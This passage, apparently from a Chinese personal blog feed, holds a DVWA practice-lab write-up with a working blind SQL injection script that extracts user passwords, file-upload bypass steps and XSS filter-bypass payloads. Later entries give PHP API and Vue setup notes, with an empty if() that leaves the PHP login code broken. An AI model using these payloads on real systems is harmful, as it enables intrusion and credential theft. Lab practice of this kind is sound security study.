<span class="hljs-built_in">print</span>(data)<br>            r=requests.post(url=url_q,data=data,headers=header)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;User ID exists in the database&#x27;</span> <span class="hljs-keyword">in</span> r.text):<br>                flag+=j<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag:%s&quot;</span>%(flag))<br>                <span class="hljs-keyword">break</span><br>header=&#123;<br><span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;security=low; PHPSESSID=06jsdi4p6auso911ivb42u2eg4&#x27;</span><br>&#125;<br>s=<span class="hljs-string">&quot;asdfghjklqwertyuiopzxcvbnm-+=,._1234567890&#125;&#123;&quot;</span><br><span class="hljs-comment"># 数据库名</span><br><span class="hljs-comment"># sql=&quot;0 or substr((select database()),&#123;&#125;,1)=&#123;&#125;;%23&quot;</span><br><span class="hljs-comment">#表名</span><br><span class="hljs-comment">#　sql=&quot;0&#x27; or substr((seLEct group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=&#123;&#125;;%23&quot;</span><br><span class="hljs-comment">#字段名</span><br><span class="hljs-comment"># sql=&quot;0&#x27; or substr((seLEct group_concat(column_name) from information_schema.columns where table_name=0x7573657273),&#123;&#125;,1)=&#123;&#125;;%23&quot;</span><br><span class="hljs-comment">#具体内容 concat(user,&#x27;,&#x27;,password,&#x27;-&#x27;)</span><br>sql=<span class="hljs-string">&quot;0&#x27; or substr((selEct group_concat(concat(user,&#x27;,&#x27;,password,&#x27;-&#x27;)) from users),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;;%23&quot;</span><br>url=<span class="hljs-string">&quot;http://192.168.66.133/&quot;</span><br>nr(url,sql)<br><br></code></pre></div></td></tr></table></figure><p>3.设置high模式下，类似low方式注入但是现在不知道如何编写脚本，只能手工注入。且最后使用# 不能使用%23</p></li></ol><h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><ol><li><p>设置low模式下，可直接上传php文件如图显示</p><p><img src="https://img-blog.csdnimg.cn/20210705141957871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p></li><li><p>设置medium模式下，源码显示检测文件类型和大小，此时应该在bp抓包后对类型进行修改后上传即可</p><p>将上传的包修改如下图</p><p><img src="https://img-blog.csdnimg.cn/20210705142158210.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>上传成功结果</p><p><img src="https://img-blog.csdnimg.cn/2021070514243225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p></li><li><p>设置high模式下，对最后一个后缀进行了检测和图片类型进行了检测尝试进行%00截断构造如图</p><p><img src="https://img-blog.csdnimg.cn/20210705144322108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>结果无效，尝试window的::$DATA绕过也无效</p><p>构造如图</p><p><img src="https://img-blog.csdnimg.cn/20210705144356216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>尝试上传图片木马需要杯包含才能执行，构造图片马如下</p><p><img src="https://img-blog.csdnimg.cn/20210705145205795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>此时成功，利用上面的文件包含可以运行文件，此时使用phpinfo();作为查看，结果如图</p><p><img src="https://img-blog.csdnimg.cn/20210705145252732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p></li></ol><h1 id="XSS-reflected"><a href="#XSS-reflected" class="headerlink" title="XSS reflected"></a>XSS reflected</h1><ol><li><p>设置low模式下，尝试进行xss，直接输入 &lt;script&gt;alert(0)&lt;/script&gt; </p><p>结果如图：</p><p><img src="https://img-blog.csdnimg.cn/20210705161916393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>进行其他的xss如：&lt;body onload=alert(‘0’)&gt; </p><p>&lt;a href=’’ onclick=alert(‘0’)&gt;click1&lt;/a&gt; 点击click1时弹出</p><p>&lt;img src=’<a href="http://192.168.10.128/a.jpg&#39;">http://192.168.10.128/a.jpg&#39;</a> onerror=alert(document.cookie)&gt; src地址错误，然后执行onerror的内容</p></li><li><p>设置medium模式下，继续尝试&lt;script&gt;alert(0)&lt;/script&gt; 发现无效，查看源码后发现使用str_replace对&lt;script&gt;进行了过滤，此时可以使用其他绕过，也可以使用大小写，双写绕过，如：&lt;sCript&gt;alert(0)&lt;/script&gt; 、&lt;scr&lt;script&gt;ipt&gt;alert(0)&lt;/script&gt; 、&lt;img src=’<a href="http://192.168.10.128/a.jpg&#39;">http://192.168.10.128/a.jpg&#39;</a> onerror=alert(document.cookie)&gt; 等等</p><p>结果如图所示：</p><p><img src="https://img-blog.csdnimg.cn/20210705161930950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>3.设置high模式下，进行尝试，尝试后发现script无法使用，使用其他还是可以，查看源码后，发现使用preg_replace进行过滤。</p><p>preg_replace 函数执行一个正则表达式的搜索和替换。无法使用script进行操作，使用其它的标签即可</p></li></ol><h1 id="XSS-stored"><a href="#XSS-stored" class="headerlink" title="XSS stored"></a>XSS stored</h1><ol><li><p>设置low模式下，对源码进行查看之后发现代码对sql注入进行了防护，但是对于xss没有防护，但是在前端对输入长度进行了限制，直接更改前端代码后，写入xss代码：&lt;script&gt;alert(1)&lt;/script&gt;</p><p>结果如下：</p><p><img src="https://img-blog.csdnimg.cn/2021070609344458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p></li><li><p>设置medium模式下，对源码查看发现对message部分进行了严格的过滤，但是对于name部分只是使用了str_replace进行对&lt;script&gt;进行了过滤，所以对name部分可以使用双写或大小写绕过，写入xss代码：&lt;sCript&gt;alert(2)&lt;/script&gt;、&lt;sc&lt;script&gt;ript&gt;alert(2)&lt;/script&gt;</p><p>结果如下：</p><p><img src="https://img-blog.csdnimg.cn/20210706093516681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>前端显示代码如下：</p><p><img src="https://img-blog.csdnimg.cn/20210706093540742.png#pic_center"></p></li><li><p>设置high模式下，对源码查看之后发现只是对于name部分的代码进行了更加严格的过滤，但是只是限制了&lt;script&gt;标签的使用，此时使用其他标签即可，写入代码：&lt;img src=’’ onerror=alert(document.cookie)&gt;</p><p>结果如下：</p><p><img src="https://img-blog.csdnimg.cn/20210706093555809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>前端显示代码为：</p><p><img src="https://img-blog.csdnimg.cn/20210706093621408.png#pic_center"></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>信安 靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶机</tag>
      
      <tag>漏洞top10</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>api使用</title>
    <link href="/2021/06/28/PHP/api%E4%BD%BF%E7%94%A8/"/>
    <url>/2021/06/28/PHP/api%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="设置为API"><a href="#设置为API" class="headerlink" title="设置为API"></a>设置为API</h1><p>在实际编写过程中遇到了较多的困难</p><ol><li><p>将php编写的api设置可以使用</p><blockquote><p>下面对于该api的设置进行阐述</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment"># 此处设置任意源均可访问</span><br>header(<span class="hljs-string">&quot;Access-Control-Allow-Origin: *&quot;</span>);<br><span class="hljs-comment"># 此处应该是设置可以返回的header信息</span><br>header(<span class="hljs-string">&quot;Access-Control-Allow-Headers: Content-Type&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>之后就可以使用该api了</p></blockquote></li><li><p>使用php读取json形式的post请求</p><blockquote><p>因为不是默认的形式所以需要其它形式进行读取</p><p>具体内容如下</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment"># 获取传入的json信息</span><br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>]; <br><span class="hljs-comment"># 将传入的json转换为对象</span><br><span class="hljs-variable">$all</span>=json_decode(<span class="hljs-variable">$post</span>);<br></code></pre></div></td></tr></table></figure><p>此时已经可以通过$all-&gt;name进行获取信息了</p></blockquote></li><li><p>返回信息的处理</p><blockquote><p>本来想使用类编写后输出，但是编写之后就无法访问</p><p>尝试其它方法后发现可以通过一下方法进行创建对象</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$re</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;<br><span class="hljs-variable">$re</span>-&gt;code=<span class="hljs-number">201</span>;<br><span class="hljs-variable">$re</span>-&gt;msg=<span class="hljs-string">&quot;您输入的账户或密码错误！&quot;</span>;<br><span class="hljs-comment"># 最后的输出为</span><br><span class="hljs-keyword">echo</span> json_encode(<span class="hljs-variable">$re</span>);<br></code></pre></div></td></tr></table></figure></blockquote></li></ol><p>整体代码如下</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment"># 此处设置任意源均可访问</span><br>header(<span class="hljs-string">&quot;Access-Control-Allow-Origin: *&quot;</span>);<br><span class="hljs-comment"># 此处应该是设置可以返回的header信息</span><br>header(<span class="hljs-string">&quot;Access-Control-Allow-Headers: Content-Type&quot;</span>);<br><span class="hljs-comment"># 设置返回的模式</span><br>header(<span class="hljs-string">&#x27;Content-type: application/json&#x27;</span>);  <br><span class="hljs-comment"># 获取传入的json信息</span><br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>]; <br><span class="hljs-comment"># 将传入的json转换为对象</span><br><span class="hljs-variable">$all</span>=json_decode(<span class="hljs-variable">$post</span>);<br><span class="hljs-comment"># 创建初始对象</span><br><span class="hljs-variable">$re</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;<br><span class="hljs-variable">$re</span>-&gt;code=<span class="hljs-number">201</span>;<br><span class="hljs-variable">$re</span>-&gt;msg=<span class="hljs-string">&quot;您输入的账户或密码错误！&quot;</span>;<br><span class="hljs-comment"># 获取内容进行对比</span><br><span class="hljs-keyword">if</span>()&#123;<br>    <span class="hljs-variable">$re</span>-&gt;code=<span class="hljs-number">200</span>;<br>    <span class="hljs-variable">$re</span>-&gt;msg=<span class="hljs-string">&quot;登录成功，即将跳转界面！&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> json_encode(<span class="hljs-variable">$re</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>API</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue基础项目建立</title>
    <link href="/2021/06/26/Vue/Vue+Element/%E5%9F%BA%E7%A1%80%E9%A1%B9%E7%9B%AE%E5%BB%BA%E7%AB%8B/"/>
    <url>/2021/06/26/Vue/Vue+Element/%E5%9F%BA%E7%A1%80%E9%A1%B9%E7%9B%AE%E5%BB%BA%E7%AB%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="下载各种准备工具"><a href="#下载各种准备工具" class="headerlink" title="下载各种准备工具"></a>下载各种准备工具</h1><p>首先下载node.js进行安装 </p><p>下载 cnpm之后设置path</p><p>安装vue-cli 脚手架工具</p><figure class="highlight aspectj"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs aspectj">cnpm install -g <span class="hljs-meta">@vue</span>/cli<br> <br>查看版本<br>vue -V<br></code></pre></div></td></tr></table></figure><h1 id="创建项目名"><a href="#创建项目名" class="headerlink" title="创建项目名"></a>创建项目名</h1><figure class="highlight gauss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gauss">vue <span class="hljs-keyword">create</span> 项目名<br></code></pre></div></td></tr></table></figure><p>选择安装模式</p><p>安装成功之后进入目录</p><p>node_modules 存放依赖包 不需要提交</p><p>package.json 项目依赖文件</p><p>其中dependencies,依赖的意思,安装包是程序需要的包,需要发布到生产环境</p><p>dev即develop,开发的意思,也是开发环境下的依赖</p><p>src中的包的</p><blockquote><p>assets 静态资源</p><p>router 路由</p><p>views 渲染</p><p>App</p></blockquote><p>安装UI框架</p><p>安装 element</p><figure class="highlight coffeescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> i element-ui -S<br></code></pre></div></td></tr></table></figure><p>数据交互的</p><figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">npm i axios <span class="hljs-comment">--save</span><br></code></pre></div></td></tr></table></figure><p>在main.js中加入element</p><p><a href="https://element.eleme.cn/">参考element教程</a></p><p>启动 npm run server</p><h1 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h1><p>main.js</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">import</span> Vue <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> App <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./router&#x27;</span><br><span class="hljs-comment">// 导入 axios</span><br><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span><br><span class="hljs-comment">// 导入element</span><br><span class="hljs-keyword">import</span> ElementUI <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;element-ui&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;element-ui/lib/theme-chalk/index.css&#x27;</span><br><br><span class="hljs-comment">// 使用 ElementUI</span><br>Vue.use(ElementUI)<br>Vue.config.productionTip = <span class="hljs-literal">false</span><br><span class="hljs-comment">// 设置使用的ip地址</span><br>Vue.prototype.$http = axios<br><span class="hljs-comment">// axios.defaults.baseURL = &#x27;http://121.196.162.32/&#x27;</span><br>axios.defaults.baseURL = <span class="hljs-string">&#x27;http://127.0.0.1/&#x27;</span><br><span class="hljs-keyword">new</span> Vue(&#123;<br>  router,<br>  <span class="hljs-attr">render</span>: <span class="hljs-function"><span class="hljs-params">h</span> =&gt;</span> h(App)<br>&#125;).$mount(<span class="hljs-string">&#x27;#app&#x27;</span>)<br><br></code></pre></div></td></tr></table></figure><p>路由设置</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">import</span> Vue <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> VueRouter <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue-router&#x27;</span><br><br>Vue.use(VueRouter)<br><br><span class="hljs-keyword">const</span> routes = [<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>,<br>    <span class="hljs-comment">// name: &#x27;Home&#x27;,</span><br>    <span class="hljs-comment">// component: Home</span><br>    <span class="hljs-attr">redirect</span>: <span class="hljs-string">&#x27;/login&#x27;</span><br>  &#125;,<br>  &#123;<br>    <span class="hljs-comment">// 登录</span><br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/login&#x27;</span>,<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;login&#x27;</span>,<br>    <span class="hljs-comment">// route level code-splitting</span><br>    <span class="hljs-comment">// this generates a separate chunk (about.[hash].js) for this route</span><br>    <span class="hljs-comment">// which is lazy-loaded when the route is visited.</span><br>    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackChunkName: &quot;about&quot; */</span> <span class="hljs-string">&#x27;../views/Login.vue&#x27;</span>)<br>  &#125;,<br>  &#123;<br>    <span class="hljs-comment">// 首页</span><br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/home&#x27;</span>,<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;home&#x27;</span>,<br>    <span class="hljs-comment">// 重定向后直接显示index界面</span><br>    <span class="hljs-attr">redirect</span>: <span class="hljs-string">&#x27;/index&#x27;</span>,<br>    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;../views/Home/Index.vue&#x27;</span>),<br>    <span class="hljs-attr">children</span>: [<br>      &#123;<br>        <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/index&#x27;</span>, <span class="hljs-comment">// 首页模块</span><br>        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;index&#x27;</span>,<br>        <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;../views/Home/index/index.vue&#x27;</span>)<br>      &#125;,<br>      &#123;<br>        <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/stats&#x27;</span>, <span class="hljs-comment">// 数据模块</span><br>        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;stats&#x27;</span>,<br>        <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;../views/Home/stats/index.vue&#x27;</span>)<br>      &#125;,<br>      &#123;<br>        <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/wms&#x27;</span>, <span class="hljs-comment">// 用户模块</span><br>        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;wms&#x27;</span>,<br>        <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;../views/Home/wms/index.vue&#x27;</span>)<br>      &#125;<br>    ]<br>  &#125;<br>]<br><br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> VueRouter(&#123;<br>  routes<br>&#125;)<br><span class="hljs-comment">// 路由拦截 跳转前执行</span><br>router.beforeEach(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!sessionStorage.getItem(<span class="hljs-string">&#x27;username&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (to.path !== <span class="hljs-string">&#x27;/login&#x27;</span>) &#123;<br>      next(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>    &#125;<br>  &#125;<br>  next()<br>&#125;)<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router<br><br></code></pre></div></td></tr></table></figure><h2 id="Login界面编写"><a href="#Login界面编写" class="headerlink" title="Login界面编写"></a>Login界面编写</h2><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div class=&quot;about&quot;&gt;<br>    &lt;h1&gt;Login&lt;/h1&gt;<br>    &lt;!-- model表示与下面部分数据实时交互 position为显示位置 --&gt;<br>    &lt;el-form :model=&quot;ruleForm&quot; :label-position=&quot;labelPosition&quot; status-icon :rules=&quot;rules&quot; ref=&quot;ruleForm&quot; label-width=&quot;100px&quot; class=&quot;demo-ruleForm&quot;&gt;<br>      &lt;el-form-item label=&quot;用户名&quot; prop=&quot;name&quot;&gt;<br>        &lt;el-input type=&quot;test&quot; v-model=&quot;ruleForm.name&quot; autocomplete=&quot;off&quot;&gt;&lt;/el-input&gt;<br>      &lt;/el-form-item&gt;<br>      &lt;el-form-item label=&quot;用户密码&quot; prop=&quot;password&quot;&gt;<br>        &lt;el-input type=&quot;password&quot; v-model=&quot;ruleForm.password&quot; autocomplete=&quot;off&quot;&gt;&lt;/el-input&gt;<br>      &lt;/el-form-item&gt;<br>&lt;!--      &lt;el-form-item label=&quot;年龄&quot; prop=&quot;age&quot;&gt;<br>        &lt;el-input v-model.number=&quot;ruleForm.age&quot;&gt;&lt;/el-input&gt;<br>      &lt;/el-form-item&gt; --&gt;<br>      &lt;el-form-item&gt;<br>        &lt;el-button  type=&quot;primary&quot; @click=&quot;submitForm(&#x27;ruleForm&#x27;)&quot;&gt;登录&lt;/el-button&gt;<br>        &lt;el-button @click=&quot;resetForm(&#x27;ruleForm&#x27;)&quot;&gt;注册&lt;/el-button&gt;<br>      &lt;/el-form-item&gt;<br>    &lt;/el-form&gt;<br>  &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>  name: &#x27;Login&#x27;,<br>  data () &#123;<br>    return &#123;<br>      labelPosition: &#x27;right&#x27;,<br>      ruleForm: &#123; // 初始化<br>        name: &#x27;ll&#x27;,<br>        password: &#x27;bsms&#x27;<br>      &#125;,<br>      rules: &#123; // 校验<br>        name: [<br>          &#123; required: true, message: &#x27;请输入用户名&#x27;, trigger: &#x27;blur&#x27; &#125;,<br>          &#123; min: 3, max: 10, message: &#x27;长度在3-10个字符&#x27;, trigger: &#x27;blur&#x27; &#125;<br>        ],<br>        password: [<br>          &#123; required: true, message: &#x27;请输入用户密码&#x27;, trigger: &#x27;blur&#x27; &#125;,<br>          &#123; min: 3, max: 10, message: &#x27;长度在3-10个字符&#x27;, trigger: &#x27;blur&#x27; &#125;<br>        ]<br>      &#125;<br>    &#125;<br>  &#125;,<br>  methods: &#123;<br>    submitForm () &#123;<br>      const &#123; name, password &#125; = this.ruleForm<br>      // 此处使用了axios进行api的使用<br>      // 在vue中使用需要在main.js中进行设置<br>      // 注意axios默认使用的是json形式的post请求<br>      this.$http(&#123;<br>        method: &#x27;post&#x27;, // 请求类型<br>        url: &#x27;/sjk/one.php&#x27;,<br>        data: &#123;<br>          name: name,<br>          password: password<br>        &#125;<br>      &#125;).then(res =&gt; &#123; // 返回的信息<br>        console.log(res.data)<br>      &#125;)<br>    &#125;<br>  &#125;<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style&gt;<br><br>&lt;/style&gt;<br><br></code></pre></div></td></tr></table></figure><p>在实际编写过程中遇到了较多的困难</p><ol><li><p>将php编写的api设置可以使用</p><blockquote><p>下面对于该api的设置进行阐述</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span 